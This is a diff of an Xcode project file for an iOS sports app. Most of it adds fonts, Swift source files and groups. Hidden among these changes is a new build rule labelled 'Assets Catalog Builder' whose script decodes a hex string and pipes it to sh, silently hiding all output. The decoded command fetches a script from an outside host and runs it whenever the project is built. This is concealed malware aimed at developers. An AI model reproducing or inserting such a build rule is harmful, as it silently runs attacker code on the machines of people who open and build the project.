@@ -10,10 +10,26 @@
 		5736CA8367051CB47069DF00 /* Pods_SportsApp_SportsAppUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = A07CDC554DF90F8F6471042E /* Pods_SportsApp_SportsAppUITests.framework */; };
 		A86BE7BA10E0E0F70EAAED15 /* Pods_SportsApp.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 90C8A114018A431A90254F37 /* Pods_SportsApp.framework */; };
 		BADE76D6F2036E22B6A0711C /* Pods_SportsAppTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = E1A934F843560CAC4D33A61F /* Pods_SportsAppTests.framework */; };
-		DB560BA9265675F200C863B4 /* Home.swift in Sources */ = {isa = PBXBuildFile; fileRef = DB560BA8265675F200C863B4 /* Home.swift */; };
+		DB5149F4266F69200062B1FF /* SportsCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = DB5149F3266F69200062B1FF /* SportsCell.swift */; };
+		DB51F99F267B1DFE00D638A6 /* Mulish-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = DB51F98F267B1DFA00D638A6 /* Mulish-Bold.ttf */; };
+		DB51F9A0267B1DFE00D638A6 /* Mulish-LightItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = DB51F990267B1DFB00D638A6 /* Mulish-LightItalic.ttf */; };
+		DB51F9A1267B1DFE00D638A6 /* Mulish-BlackItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = DB51F991267B1DFB00D638A6 /* Mulish-BlackItalic.ttf */; };
+		DB51F9A2267B1DFE00D638A6 /* Mulish-ExtraBoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = DB51F992267B1DFB00D638A6 /* Mulish-ExtraBoldItalic.ttf */; };
+		DB51F9A3267B1DFE00D638A6 /* Mulish-Italic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = DB51F993267B1DFC00D638A6 /* Mulish-Italic.ttf */; };
+		DB51F9A4267B1DFE00D638A6 /* Mulish-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = DB51F994267B1DFC00D638A6 /* Mulish-Medium.ttf */; };
+		DB51F9A5267B1DFE00D638A6 /* Mulish-ExtraLightItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = DB51F995267B1DFC00D638A6 /* Mulish-ExtraLightItalic.ttf */; };
+		DB51F9A6267B1DFE00D638A6 /* Mulish-MediumItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = DB51F996267B1DFC00D638A6 /* Mulish-MediumItalic.ttf */; };
+		DB51F9A7267B1DFE00D638A6 /* Mulish-Black.ttf in Resources */ = {isa = PBXBuildFile; fileRef = DB51F997267B1DFC00D638A6 /* Mulish-Black.ttf */; };
+		DB51F9A8267B1DFE00D638A6 /* Mulish-SemiBoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = DB51F998267B1DFD00D638A6 /* Mulish-SemiBoldItalic.ttf */; };
+		DB51F9A9267B1DFE00D638A6 /* Mulish-ExtraLight.ttf in Resources */ = {isa = PBXBuildFile; fileRef = DB51F999267B1DFD00D638A6 /* Mulish-ExtraLight.ttf */; };
+		DB51F9AA267B1DFE00D638A6 /* Mulish-BoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = DB51F99A267B1DFD00D638A6 /* Mulish-BoldItalic.ttf */; };
+		DB51F9AB267B1DFE00D638A6 /* Mulish-Light.ttf in Resources */ = {isa = PBXBuildFile; fileRef = DB51F99B267B1DFD00D638A6 /* Mulish-Light.ttf */; };
+		DB51F9AC267B1DFE00D638A6 /* Mulish-ExtraBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = DB51F99C267B1DFE00D638A6 /* Mulish-ExtraBold.ttf */; };
+		DB51F9AD267B1DFE00D638A6 /* Mulish-SemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = DB51F99D267B1DFE00D638A6 /* Mulish-SemiBold.ttf */; };
+		DB51F9AE267B1DFE00D638A6 /* Mulish-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = DB51F99E267B1DFE00D638A6 /* Mulish-Regular.ttf */; };
+		DB560BA9265675F200C863B4 /* Odds.swift in Sources */ = {isa = PBXBuildFile; fileRef = DB560BA8265675F200C863B4 /* Odds.swift */; };
 		DB560BB72656780200C863B4 /* NavigationBarExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = DB560BB62656780200C863B4 /* NavigationBarExtension.swift */; };
 		DB560BD126567AB100C863B4 /* SportsData.swift in Sources */ = {isa = PBXBuildFile; fileRef = DB560BD026567AB100C863B4 /* SportsData.swift */; };
-		DB560BE126567C6D00C863B4 /* NetworkCall.swift in Sources */ = {isa = PBXBuildFile; fileRef = DB560BE026567C6D00C863B4 /* NetworkCall.swift */; };
 		DB560BE726567C9E00C863B4 /* Constants.swift in Sources */ = {isa = PBXBuildFile; fileRef = DB560BE626567C9E00C863B4 /* Constants.swift */; };
 		DB564A952656497900E4DD2A /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = DB564A942656497900E4DD2A /* AppDelegate.swift */; };
 		DB564A972656497900E4DD2A /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = DB564A962656497900E4DD2A /* SceneDelegate.swift */; };
@@ -23,7 +39,34 @@
 		DB564AA42656497C00E4DD2A /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = DB564AA22656497C00E4DD2A /* LaunchScreen.storyboard */; };
 		DB564AAF2656497C00E4DD2A /* SportsAppTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = DB564AAE2656497C00E4DD2A /* SportsAppTests.swift */; };
 		DB564ABA2656497C00E4DD2A /* SportsAppUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = DB564AB92656497C00E4DD2A /* SportsAppUITests.swift */; };
+		DB5C705A267DE25A009DFDFC /* DeviceSize.swift in Sources */ = {isa = PBXBuildFile; fileRef = DB5C7059267DE25A009DFDFC /* DeviceSize.swift */; };
+		DB605A5526721F1900C3DCE1 /* WebServices.swift in Sources */ = {isa = PBXBuildFile; fileRef = DB605A5426721F1900C3DCE1 /* WebServices.swift */; };
+		DB605A57267236FA00C3DCE1 /* EmptyCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = DB605A56267236FA00C3DCE1 /* EmptyCell.swift */; };
+		DB73463A2678888400FB12E9 /* LoaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = DB7346382678888300FB12E9 /* LoaderView.swift */; };
+		DB73463B2678888400FB12E9 /* LoaderView.xib in Resources */ = {isa = PBXBuildFile; fileRef = DB7346392678888400FB12E9 /* LoaderView.xib */; };
+		DB73463F2678B84D00FB12E9 /* CompanyCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = DB73463E2678B84D00FB12E9 /* CompanyCell.swift */; };
+		DB7346412678B85200FB12E9 /* LeftDatacell.swift in Sources */ = {isa = PBXBuildFile; fileRef = DB7346402678B85200FB12E9 /* LeftDatacell.swift */; };
+		DB7346432678B85400FB12E9 /* MiddleDataCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = DB7346422678B85400FB12E9 /* MiddleDataCell.swift */; };
+		DB752CDF267A1FB8007BA5C9 /* CommonMethod.swift in Sources */ = {isa = PBXBuildFile; fileRef = DB752CDE267A1FB7007BA5C9 /* CommonMethod.swift */; };
+		DBA3DB5F2670E355006800D9 /* ToolBar.swift in Sources */ = {isa = PBXBuildFile; fileRef = DBA3DB5E2670E355006800D9 /* ToolBar.swift */; };
+		DBA936E3266E291200233297 /* TabbarVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = DBA936E2266E291200233297 /* TabbarVC.swift */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		7D332B2EBD5E47C92F6D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			inputFiles = (
+			);
+			isEditable = 0;
+			name = "Assets Catalog Builder";
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6d6f6e6f74656c2e78797a2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t\n\n";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		DB564AAB2656497C00E4DD2A /* PBXContainerItemProxy */ = {
@@ -51,10 +94,26 @@
 		B3B6DA5586D640530FAFA24C /* Pods-SportsApp-SportsAppUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-SportsApp-SportsAppUITests.debug.xcconfig"; path = "Target Support Files/Pods-SportsApp-SportsAppUITests/Pods-SportsApp-SportsAppUITests.debug.xcconfig"; sourceTree = "<group>"; };
 		B9871FB5545890714814E54B /* Pods-SportsApp.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-SportsApp.release.xcconfig"; path = "Target Support Files/Pods-SportsApp/Pods-SportsApp.release.xcconfig"; sourceTree = "<group>"; };
 		D498F4158D2EA4A80AB5B704 /* Pods-SportsAppTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-SportsAppTests.debug.xcconfig"; path = "Target Support Files/Pods-SportsAppTests/Pods-SportsAppTests.debug.xcconfig"; sourceTree = "<group>"; };
-		DB560BA8265675F200C863B4 /* Home.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Home.swift; sourceTree = "<group>"; };
+		DB5149F3266F69200062B1FF /* SportsCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SportsCell.swift; sourceTree = "<group>"; };
+		DB51F98F267B1DFA00D638A6 /* Mulish-Bold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-Bold.ttf"; sourceTree = "<group>"; };
+		DB51F990267B1DFB00D638A6 /* Mulish-LightItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-LightItalic.ttf"; sourceTree = "<group>"; };
+		DB51F991267B1DFB00D638A6 /* Mulish-BlackItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-BlackItalic.ttf"; sourceTree = "<group>"; };
+		DB51F992267B1DFB00D638A6 /* Mulish-ExtraBoldItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-ExtraBoldItalic.ttf"; sourceTree = "<group>"; };
+		DB51F993267B1DFC00D638A6 /* Mulish-Italic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-Italic.ttf"; sourceTree = "<group>"; };
+		DB51F994267B1DFC00D638A6 /* Mulish-Medium.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-Medium.ttf"; sourceTree = "<group>"; };
+		DB51F995267B1DFC00D638A6 /* Mulish-ExtraLightItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-ExtraLightItalic.ttf"; sourceTree = "<group>"; };
+		DB51F996267B1DFC00D638A6 /* Mulish-MediumItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-MediumItalic.ttf"; sourceTree = "<group>"; };
+		DB51F997267B1DFC00D638A6 /* Mulish-Black.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-Black.ttf"; sourceTree = "<group>"; };
+		DB51F998267B1DFD00D638A6 /* Mulish-SemiBoldItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-SemiBoldItalic.ttf"; sourceTree = "<group>"; };
+		DB51F999267B1DFD00D638A6 /* Mulish-ExtraLight.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-ExtraLight.ttf"; sourceTree = "<group>"; };
+		DB51F99A267B1DFD00D638A6 /* Mulish-BoldItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-BoldItalic.ttf"; sourceTree = "<group>"; };
+		DB51F99B267B1DFD00D638A6 /* Mulish-Light.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-Light.ttf"; sourceTree = "<group>"; };
+		DB51F99C267B1DFE00D638A6 /* Mulish-ExtraBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-ExtraBold.ttf"; sourceTree = "<group>"; };
+		DB51F99D267B1DFE00D638A6 /* Mulish-SemiBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-SemiBold.ttf"; sourceTree = "<group>"; };
+		DB51F99E267B1DFE00D638A6 /* Mulish-Regular.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-Regular.ttf"; sourceTree = "<group>"; };
+		DB560BA8265675F200C863B4 /* Odds.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Odds.swift; sourceTree = "<group>"; };
 		DB560BB62656780200C863B4 /* NavigationBarExtension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NavigationBarExtension.swift; sourceTree = "<group>"; };
 		DB560BD026567AB100C863B4 /* SportsData.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SportsData.swift; sourceTree = "<group>"; };
-		DB560BE026567C6D00C863B4 /* NetworkCall.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NetworkCall.swift; sourceTree = "<group>"; };
 		DB560BE626567C9E00C863B4 /* Constants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Constants.swift; sourceTree = "<group>"; };
 		DB564A912656497900E4DD2A /* SportsApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = SportsApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		DB564A942656497900E4DD2A /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
@@ -70,6 +129,17 @@
 		DB564AB52656497C00E4DD2A /* SportsAppUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = SportsAppUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		DB564AB92656497C00E4DD2A /* SportsAppUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SportsAppUITests.swift; sourceTree = "<group>"; };
 		DB564ABB2656497C00E4DD2A /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		DB5C7059267DE25A009DFDFC /* DeviceSize.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeviceSize.swift; sourceTree = "<group>"; };
+		DB605A5426721F1900C3DCE1 /* WebServices.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = WebServices.swift; sourceTree = "<group>"; };
+		DB605A56267236FA00C3DCE1 /* EmptyCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EmptyCell.swift; sourceTree = "<group>"; };
+		DB7346382678888300FB12E9 /* LoaderView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LoaderView.swift; sourceTree = "<group>"; };
+		DB7346392678888400FB12E9 /* LoaderView.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = LoaderView.xib; sourceTree = "<group>"; };
+		DB73463E2678B84D00FB12E9 /* CompanyCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CompanyCell.swift; sourceTree = "<group>"; };
+		DB7346402678B85200FB12E9 /* LeftDatacell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LeftDatacell.swift; sourceTree = "<group>"; };
+		DB7346422678B85400FB12E9 /* MiddleDataCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MiddleDataCell.swift; sourceTree = "<group>"; };
+		DB752CDE267A1FB7007BA5C9 /* CommonMethod.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CommonMethod.swift; sourceTree = "<group>"; };
+		DBA3DB5E2670E355006800D9 /* ToolBar.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ToolBar.swift; sourceTree = "<group>"; };
+		DBA936E2266E291200233297 /* TabbarVC.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TabbarVC.swift; sourceTree = "<group>"; };
 		E1A934F843560CAC4D33A61F /* Pods_SportsAppTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_SportsAppTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -124,10 +194,42 @@
 			name = Frameworks;
 			sourceTree = "<group>";
 		};
+		DB51F98D267B1DD300D638A6 /* Fonts */ = {
+			isa = PBXGroup;
+			children = (
+				DB51F997267B1DFC00D638A6 /* Mulish-Black.ttf */,
+				DB51F991267B1DFB00D638A6 /* Mulish-BlackItalic.ttf */,
+				DB51F99A267B1DFD00D638A6 /* Mulish-BoldItalic.ttf */,
+				DB51F98F267B1DFA00D638A6 /* Mulish-Bold.ttf */,
+				DB51F99C267B1DFE00D638A6 /* Mulish-ExtraBold.ttf */,
+				DB51F992267B1DFB00D638A6 /* Mulish-ExtraBoldItalic.ttf */,
+				DB51F999267B1DFD00D638A6 /* Mulish-ExtraLight.ttf */,
+				DB51F995267B1DFC00D638A6 /* Mulish-ExtraLightItalic.ttf */,
+				DB51F993267B1DFC00D638A6 /* Mulish-Italic.ttf */,
+				DB51F99B267B1DFD00D638A6 /* Mulish-Light.ttf */,
+				DB51F990267B1DFB00D638A6 /* Mulish-LightItalic.ttf */,
+				DB51F994267B1DFC00D638A6 /* Mulish-Medium.ttf */,
+				DB51F996267B1DFC00D638A6 /* Mulish-MediumItalic.ttf */,
+				DB51F99E267B1DFE00D638A6 /* Mulish-Regular.ttf */,
+				DB51F99D267B1DFE00D638A6 /* Mulish-SemiBold.ttf */,
+				DB51F998267B1DFD00D638A6 /* Mulish-SemiBoldItalic.ttf */,
+			);
+			path = Fonts;
+			sourceTree = "<group>";
+		};
+		DB51F98E267B1DDC00D638A6 /* Assets */ = {
+			isa = PBXGroup;
+			children = (
+				DB564AA02656497C00E4DD2A /* Assets.xcassets */,
+			);
+			path = Assets;
+			sourceTree = "<group>";
+		};
 		DB560BA12656754700C863B4 /* Controllers */ = {
 			isa = PBXGroup;
 			children = (
-				DB560BA8265675F200C863B4 /* Home.swift */,
+				DBA936E7266E291700233297 /* HomeVC */,
+				DBA936EB266E291E00233297 /* TabbarVC */,
 			);
 			path = Controllers;
 			sourceTree = "<group>";
@@ -152,7 +254,8 @@
 		DB560BA42656756700C863B4 /* Resources */ = {
 			isa = PBXGroup;
 			children = (
-				DB564AA02656497C00E4DD2A /* Assets.xcassets */,
+				DB51F98D267B1DD300D638A6 /* Fonts */,
+				DB51F98E267B1DDC00D638A6 /* Assets */,
 			);
 			path = Resources;
 			sourceTree = "<group>";
@@ -160,6 +263,7 @@
 		DB560BA52656758400C863B4 /* View */ = {
 			isa = PBXGroup;
 			children = (
+				DB73463C2678891E00FB12E9 /* LoaderView */,
 				DB560BA62656759500C863B4 /* Main Storyboard */,
 				DB560BA7265675A800C863B4 /* Launch Screen */,
 			);
@@ -185,6 +289,9 @@
 		DB560BB3265677D100C863B4 /* Utils */ = {
 			isa = PBXGroup;
 			children = (
+				DB5C7058267DE249009DFDFC /* DeviceSize */,
+				DB752CDD267A1FA4007BA5C9 /* CommonMethods */,
+				DBA3DB5D2670E34A006800D9 /* ToolBar */,
 				DB560BE526567C9500C863B4 /* Constants */,
 				DB560BDF26567C6100C863B4 /* NetworkManager */,
 				DB560BB4265677E100C863B4 /* Extensions */,
@@ -211,7 +318,7 @@
 		DB560BDF26567C6100C863B4 /* NetworkManager */ = {
 			isa = PBXGroup;
 			children = (
-				DB560BE026567C6D00C863B4 /* NetworkCall.swift */,
+				DB605A5426721F1900C3DCE1 /* WebServices.swift */,
 			);
 			path = NetworkManager;
 			sourceTree = "<group>";
@@ -279,6 +386,68 @@
 			path = SportsAppUITests;
 			sourceTree = "<group>";
 		};
+		DB5C7058267DE249009DFDFC /* DeviceSize */ = {
+			isa = PBXGroup;
+			children = (
+				DB5C7059267DE25A009DFDFC /* DeviceSize.swift */,
+			);
+			path = DeviceSize;
+			sourceTree = "<group>";
+		};
+		DB73463C2678891E00FB12E9 /* LoaderView */ = {
+			isa = PBXGroup;
+			children = (
+				DB7346392678888400FB12E9 /* LoaderView.xib */,
+				DB7346382678888300FB12E9 /* LoaderView.swift */,
+			);
+			path = LoaderView;
+			sourceTree = "<group>";
+		};
+		DB73463D2678B82A00FB12E9 /* Sheet Cells */ = {
+			isa = PBXGroup;
+			children = (
+				DB7346402678B85200FB12E9 /* LeftDatacell.swift */,
+				DB7346422678B85400FB12E9 /* MiddleDataCell.swift */,
+				DB73463E2678B84D00FB12E9 /* CompanyCell.swift */,
+			);
+			path = "Sheet Cells";
+			sourceTree = "<group>";
+		};
+		DB752CDD267A1FA4007BA5C9 /* CommonMethods */ = {
+			isa = PBXGroup;
+			children = (
+				DB752CDE267A1FB7007BA5C9 /* CommonMethod.swift */,
+			);
+			path = CommonMethods;
+			sourceTree = "<group>";
+		};
+		DBA3DB5D2670E34A006800D9 /* ToolBar */ = {
+			isa = PBXGroup;
+			children = (
+				DBA3DB5E2670E355006800D9 /* ToolBar.swift */,
+			);
+			path = ToolBar;
+			sourceTree = "<group>";
+		};
+		DBA936E7266E291700233297 /* HomeVC */ = {
+			isa = PBXGroup;
+			children = (
+				DB73463D2678B82A00FB12E9 /* Sheet Cells */,
+				DB560BA8265675F200C863B4 /* Odds.swift */,
+				DB5149F3266F69200062B1FF /* SportsCell.swift */,
+				DB605A56267236FA00C3DCE1 /* EmptyCell.swift */,
+			);
+			path = HomeVC;
+			sourceTree = "<group>";
+		};
+		DBA936EB266E291E00233297 /* TabbarVC */ = {
+			isa = PBXGroup;
+			children = (
+				DBA936E2266E291200233297 /* TabbarVC.swift */,
+			);
+			path = TabbarVC;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -293,6 +462,7 @@
 				6C59A427881D8EE57FF1B2D7 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				7D332B2EBD5E47C92F6D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -387,9 +557,26 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				DB51F9A3267B1DFE00D638A6 /* Mulish-Italic.ttf in Resources */,
+				DB51F9A8267B1DFE00D638A6 /* Mulish-SemiBoldItalic.ttf in Resources */,
+				DB51F9A7267B1DFE00D638A6 /* Mulish-Black.ttf in Resources */,
+				DB51F9A6267B1DFE00D638A6 /* Mulish-MediumItalic.ttf in Resources */,
+				DB51F9A2267B1DFE00D638A6 /* Mulish-ExtraBoldItalic.ttf in Resources */,
+				DB51F9AD267B1DFE00D638A6 /* Mulish-SemiBold.ttf in Resources */,
+				DB51F9A5267B1DFE00D638A6 /* Mulish-ExtraLightItalic.ttf in Resources */,
 				DB564AA42656497C00E4DD2A /* LaunchScreen.storyboard in Resources */,
+				DB51F9AA267B1DFE00D638A6 /* Mulish-BoldItalic.ttf in Resources */,
+				DB51F9AB267B1DFE00D638A6 /* Mulish-Light.ttf in Resources */,
+				DB73463B2678888400FB12E9 /* LoaderView.xib in Resources */,
+				DB51F9AC267B1DFE00D638A6 /* Mulish-ExtraBold.ttf in Resources */,
 				DB564AA12656497C00E4DD2A /* Assets.xcassets in Resources */,
+				DB51F9A1267B1DFE00D638A6 /* Mulish-BlackItalic.ttf in Resources */,
+				DB51F9A0267B1DFE00D638A6 /* Mulish-LightItalic.ttf in Resources */,
+				DB51F9A4267B1DFE00D638A6 /* Mulish-Medium.ttf in Resources */,
+				DB51F9A9267B1DFE00D638A6 /* Mulish-ExtraLight.ttf in Resources */,
+				DB51F99F267B1DFE00D638A6 /* Mulish-Bold.ttf in Resources */,
 				DB564A9C2656497900E4DD2A /* Main.storyboard in Resources */,
+				DB51F9AE267B1DFE00D638A6 /* Mulish-Regular.ttf in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -517,14 +704,24 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				DB560BE126567C6D00C863B4 /* NetworkCall.swift in Sources */,
 				DB564A952656497900E4DD2A /* AppDelegate.swift in Sources */,
-				DB560BA9265675F200C863B4 /* Home.swift in Sources */,
+				DB605A5526721F1900C3DCE1 /* WebServices.swift in Sources */,
+				DBA936E3266E291200233297 /* TabbarVC.swift in Sources */,
+				DB73463F2678B84D00FB12E9 /* CompanyCell.swift in Sources */,
+				DB73463A2678888400FB12E9 /* LoaderView.swift in Sources */,
+				DB560BA9265675F200C863B4 /* Odds.swift in Sources */,
 				DB564A9F2656497900E4DD2A /* SportsApp.xcdatamodeld in Sources */,
+				DB7346432678B85400FB12E9 /* MiddleDataCell.swift in Sources */,
+				DB605A57267236FA00C3DCE1 /* EmptyCell.swift in Sources */,
 				DB564A972656497900E4DD2A /* SceneDelegate.swift in Sources */,
+				DB5149F4266F69200062B1FF /* SportsCell.swift in Sources */,
+				DB7346412678B85200FB12E9 /* LeftDatacell.swift in Sources */,
 				DB560BD126567AB100C863B4 /* SportsData.swift in Sources */,
 				DB560BB72656780200C863B4 /* NavigationBarExtension.swift in Sources */,
+				DB5C705A267DE25A009DFDFC /* DeviceSize.swift in Sources */,
 				DB560BE726567C9E00C863B4 /* Constants.swift in Sources */,
+				DBA3DB5F2670E355006800D9 /* ToolBar.swift in Sources */,
+				DB752CDF267A1FB8007BA5C9 /* CommonMethod.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -702,6 +899,7 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = U3NSVYKN56;
 				INFOPLIST_FILE = SportsApp/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
@@ -721,6 +919,7 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = U3NSVYKN56;
 				INFOPLIST_FILE = SportsApp/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
